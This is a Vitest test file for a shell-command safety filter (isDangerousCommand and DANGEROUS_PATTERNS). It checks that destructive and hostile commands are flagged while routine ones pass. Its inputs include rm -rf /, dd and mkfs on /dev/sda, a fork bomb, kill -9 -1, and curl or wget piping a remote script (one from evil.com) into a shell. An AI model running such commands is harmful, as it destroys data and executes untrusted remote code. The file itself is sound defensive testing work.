import { describe, it, expect } from 'vitest';
import { isDangerousCommand, DANGEROUS_PATTERNS } from './executor';

describe('isDangerousCommand', () => {
  it('should detect rm -rf /', () => {
    expect(isDangerousCommand('rm -rf /var')).toBe(true);
    expect(isDangerousCommand('rm -rf /')).toBe(true);
  });

  it('should not flag normal rm commands', () => {
    expect(isDangerousCommand('rm file.txt')).toBe(false);
    expect(isDangerousCommand('rm -rf node_modules')).toBe(false);
  });

  it('should detect mkfs commands', () => {
    expect(isDangerousCommand('mkfs.ext4 /dev/sda1')).toBe(true);
  });

  it('should detect dd commands', () => {
    expect(isDangerousCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
  });

  it('should detect fork bombs', () => {
    expect(isDangerousCommand(':(){ :|:& };:')).toBe(true);
  });

  it('should allow safe commands', () => {
    expect(isDangerousCommand('ls -la')).toBe(false);
    expect(isDangerousCommand('npm run build')).toBe(false);
    expect(isDangerousCommand('git status')).toBe(false);
  });

  it('should be case insensitive', () => {
    expect(isDangerousCommand('RM -RF /')).toBe(true);
  });

  it('should detect curl pipes to sh', () => {
    expect(isDangerousCommand('curl http://example.com/script.sh | sh')).toBe(true);
  });

  it('should detect wget pipes to bash', () => {
    expect(isDangerousCommand('wget http://evil.com/script.sh | bash')).toBe(true);
  });

  it('should detect chmod -R 777 /', () => {
    expect(isDangerousCommand('chmod -R 777 /')).toBe(true);
  });

  it('should detect shutdown commands', () => {
    expect(isDangerousCommand('shutdown -h now')).toBe(true);
  });

  it('should detect reboot commands', () => {
    expect(isDangerousCommand('/sbin/reboot')).toBe(true);
  });

  it('should detect kill -9 -1', () => {
    expect(isDangerousCommand('kill -9 -1')).toBe(true);
  });

  it('should detect device manipulation', () => {
    expect(isDangerousCommand('dd /dev/sda of=/tmp/img')).toBe(true);
  });
});

describe('DANGEROUS_PATTERNS', () => {
  it('should have all patterns compiled correctly', () => {
    for (const dp of DANGEROUS_PATTERNS) {
      expect(dp.pattern).toBeInstanceOf(RegExp);
      expect(typeof dp.label).toBe('string');
    }
  });

  it('should have at least 10 patterns', () => {
    expect(DANGEROUS_PATTERNS.length).toBeGreaterThanOrEqual(10);
  });
});
